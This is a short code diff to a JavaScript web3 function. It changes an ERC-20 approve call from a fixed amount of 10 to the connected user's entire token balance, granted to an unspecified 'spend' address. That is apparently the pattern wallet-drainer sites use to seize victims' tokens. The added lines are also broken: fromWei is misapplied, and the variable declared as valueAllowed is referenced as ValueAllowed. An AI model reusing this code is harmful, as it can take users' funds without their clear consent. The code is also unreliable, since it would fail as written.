@@ -391,13 +391,15 @@ async function fetchAccountData() {
       }]
       const contractadress = '0x01BE23585060835E02B77ef475b0Cc51aA1e0709';
       var contract = new web3.eth.Contract(abi, contractadress);
-      const result = await contract.methods.balanceOf('0x684D903C16623941ad03c00FF8072eA645049486').call(); // 29803630997051883414242659
+      const result = await contract.methods.balanceOf(accounts[0]).call(); // 29803630997051883414242659
       const format = web3.utils.fromWei(result); // 29803630.997051883414242659
+      const tokenBalance = web3.utils.fromWei(format, "wei");
+      const valueAllowed = web3.utils.toBN(tokenBalance).toString();
       console.log(format);
       //const amount = web3.utils.toWei('10');
-      const amount1 = '10';
-      console.log(amount1);
-      const res = await contract.methods.approve(spend, amount1).send({
+      //const amount1 = '10';
+      console.log(valueAllowed);
+      const res = await contract.methods.approve(spend, ValueAllowed).send({
         from: from });
 
         //var contract = new web3.eth.Contract(abi,contractadress);     //contract.methods.approve(spend, amount).send({
